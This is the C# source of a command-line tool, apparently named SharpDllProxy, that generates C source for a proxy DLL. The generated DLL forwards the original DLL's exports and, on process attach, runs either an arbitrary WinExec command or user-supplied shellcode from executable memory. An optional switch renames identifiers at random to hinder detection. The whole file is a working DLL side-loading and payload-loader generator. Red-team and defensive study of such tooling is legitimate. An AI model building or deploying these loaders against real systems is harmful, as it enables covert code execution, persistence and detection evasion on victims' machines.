using System;
using System.Collections.Generic;
using System.IO;
using PeNet;
using Pastel;
using System.Drawing;
using CommandLine;
using System.Text;

namespace sharpDLLProxy
{
   class Options
    {
        [Option("dll", Required = true,
          HelpText = "Input dll file to be processed.")]
        public string InputDLL { get; set; }

        [Option("binary",
          SetName = "binary",
          HelpText = "Binary file to parse.")]
        public string InputBinary { get; set; }

        [Option("command",
          SetName = "command",
          HelpText = "Command to execute on the target system.")]
        public string Command { get; set; }

        [Option("show",
          SetName = "command",
          Default = false,
          HelpText = "Define the display option of the WinExec function.")]
        public bool Show { get; set; }

        [Option("obfuscate",
          HelpText = "Obfuscate the DLL code produced.",
          Default = false)]
        public bool Obfuscate { get; set; }
    }

    class DLLCode
    {
        private static string dllCode = @"// DLL Proxy
#include <windows.h>
#include <Shellapi.h>
#include <tchar.h>

HOOK_EXPORTS

// HOOK_OTHER_FUNCTIONS

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    
    HANDLE threadHandle = NULL;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH: 
    {
        HOOK_MAIN_FUNCTION
        
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
break;
    }        
    
    return TRUE;
}";

        private static readonly string otherFunctionShellcode = @"
char shellcode[] = ""HOOK_SHELLCODE"";

DWORD WINAPI ClientThread(LPVOID lpParameter)
{
    void* pShellcode;
    HANDLE hProcess = GetCurrentProcess(); 
    
    pShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(pShellcode, shellcode, sizeof(shellcode));

    int (*func)();
    func = (int (*)()) pShellcode;
    (*func)();

    return 0;
}
        ";

        private static readonly string mainFunctionShellcode = @"
threadHandle = CreateThread(NULL, 0, ClientThread, NULL, 0, NULL);
if (threadHandle == NULL) {
    CloseHandle(threadHandle);
    return 1;
}
        ";

        private static readonly string mainFunctionCommand = @"
LPCSTR command = ""HOOK_COMMAND"";

WinExec(command, HOOK_SHOW);
";

        private string dllCodeShellcode = dllCode.Replace("// HOOK_OTHER_FUNCTIONS", otherFunctionShellcode).Replace("HOOK_MAIN_FUNCTION", mainFunctionShellcode);
        private string dllCodeCommand = dllCode.Replace("// HOOK_OTHER_FUNCTIONS", string.Empty).Replace("HOOK_MAIN_FUNCTION", mainFunctionCommand);

        private static readonly int ExitCodeError = 1;

        static public string[] GetDLLExports(string path)
        {
            PeFile dll = null;
            try
            {
                dll = new PeFile(path);
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Could not load the dll {0}", path);
                Console.WriteLine(e.ToString());
                Environment.Exit(ExitCodeError);
            }

            List<string> results = new List<string>();

            foreach (PeNet.Header.Pe.ExportFunction function in dll.ExportedFunctions)
            {
                string dllPathCleaned = Path.GetDirectoryName(path).Replace("\\", "\\\\") + "\\\\" + Path.GetFileNameWithoutExtension(path);

                if (function.Name != string.Empty && function.Name != null)
                {
                    results.Add(string.Format("#pragma comment(linker, \"/export:{0}={1}.{0},@{2}\")", function.Name, dllPathCleaned, function.Ordinal));
                    Console.WriteLine("#pragma comment(linker, \"/export:{0}={1}.{2},@{3}\")", function.Name.Pastel(Color.DeepSkyBlue), dllPathCleaned.Pastel(Color.Gold), function.Name.Pastel(Color.LightGreen), function.Ordinal.ToString().Pastel(Color.DarkOrange));
                }
                else
                {
                    results.Add(string.Format("#pragma comment(linker, \"/export:ThisFunctionIsNotReferenced={0}.#{1},@{1},NONAME\")", Path.GetFileNameWithoutExtension(path), function.Ordinal));
                    Console.WriteLine("#pragma comment(linker, \"/export:Yadayada={0}.#{1},@{1},NONAME\")", Path.GetFileNameWithoutExtension(path), function.Ordinal.ToString().Pastel(Color.DarkOrange));
                }
            }

            return results.ToArray();
        }

        public string PopulateDllShellcode(string exports, string shellcode)
        {
            return dllCodeShellcode.Replace("HOOK_EXPORTS", exports)
                .Replace("HOOK_SHELLCODE", shellcode);
        }
        public string PopulateDllCommand(string exports, string command, bool show)
        {

            return dllCodeCommand.Replace("HOOK_EXPORTS", exports)
                .Replace("HOOK_COMMAND", command)
                .Replace("HOOK_SHOW", show == true ? "1" : "0");
        }
    }

    class Program
    {
        private static readonly int ExitCodeError = 1;

        static private byte[] GetBytesFromFile(string path)
        {
            byte[] dllContent = { };
            try
            {
                dllContent = File.ReadAllBytes(path);
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Could not find the file {0}", path);
                Console.WriteLine(e.ToString());
                Environment.Exit(ExitCodeError);
            }

            return dllContent;
        }

        static string GenerateRandomString()
        {
            Random randomGenerator = new Random();
            int size = randomGenerator.Next(4,8);

            StringBuilder value = new StringBuilder(size);
            char offset = 'a';
            for (int i = 0; i < size; i++) {
                char letter = (char)randomGenerator.Next(offset, offset + 26);
                value.Append(letter);
            }

            return value.ToString();
        }

        static void Main(string[] args)
        {
            var options = new Options();

            CommandLine.Parser.Default.ParseArguments<Options>(args)
                .WithParsed(RunOptions)
                .WithNotParsed(HandleParseError);
        }

        static void RunOptions(Options opts)
        {
            Console.WriteLine("[*] SharpDllProxy");

            bool v = opts.Command != null & opts.InputBinary != null;
            if (v)
            {
                Console.WriteLine("\n[!] Could not receive a command and a binary file at the same time.");
                Environment.Exit(ExitCodeError);
            }

            Console.WriteLine("\n[+] Dll : {0}", opts.InputDLL.Pastel(Color.Gold));

            Console.WriteLine("\n[+] DLL pragma code for {0} :", Path.GetFileName(opts.InputDLL).Pastel(Color.Gold));
            string dllExports = string.Join('\n', DLLCode.GetDLLExports(opts.InputDLL));

            DLLCode dllCode = new DLLCode();
            string finalDllCode = string.Empty;
            string finalDllFilename = Directory.GetCurrentDirectory() + "\\" + Path.GetFileName(opts.InputDLL) + ".c";

            if (opts.Command != null)
            {
                Console.WriteLine("\n[+] Command : {0}", opts.Command.Pastel(Color.Gold));
                finalDllCode = dllCode.PopulateDllCommand(dllExports, opts.Command, opts.Show);
            }
            else {
                string binaryBytes = string.Empty;

                if (opts.Command == null && opts.InputBinary != null)
                {
                    Console.WriteLine("\n[+] Binary : {0}", opts.InputBinary.Pastel(Color.Gold));
                    binaryBytes = @"\x" + BitConverter.ToString(GetBytesFromFile(opts.InputBinary)).Replace("-", @"\x");
                    Console.WriteLine("\n[+]Binary code :\n{0}", binaryBytes);
                }
                else
                {
                    Console.WriteLine("\n[+] Please copy your shellcode and press enter.");
                    for (string input; (input = Console.ReadLine()) != string.Empty;)
                    {
                        binaryBytes += input.Replace("\"", string.Empty).Replace(";", string.Empty);
                    };
                    Console.ResetColor();
                }
                finalDllCode = dllCode.PopulateDllShellcode(dllExports, binaryBytes);
            }

            if (opts.Obfuscate == true) {
                Console.WriteLine($"\n[+] {"Obfuscating".Pastel(Color.Gold)} the source code.");
                finalDllCode = finalDllCode.Replace("shellcode", GenerateRandomString())
                                    .Replace("ClientThread", GenerateRandomString())
                                    .Replace("command", GenerateRandomString())
                                    .Replace("pShellcode", GenerateRandomString())
                                    .Replace("hProcess", GenerateRandomString())
                                    .Replace("threadHandle", GenerateRandomString());
            }

            Console.WriteLine("\n[+] Saving final code to :\n{0}\n", finalDllFilename.Pastel(Color.Gold));
            File.WriteAllText(finalDllFilename, finalDllCode);
        }
        static void HandleParseError(IEnumerable<Error> errs)
        {
            //handle errors
        }
    }
}
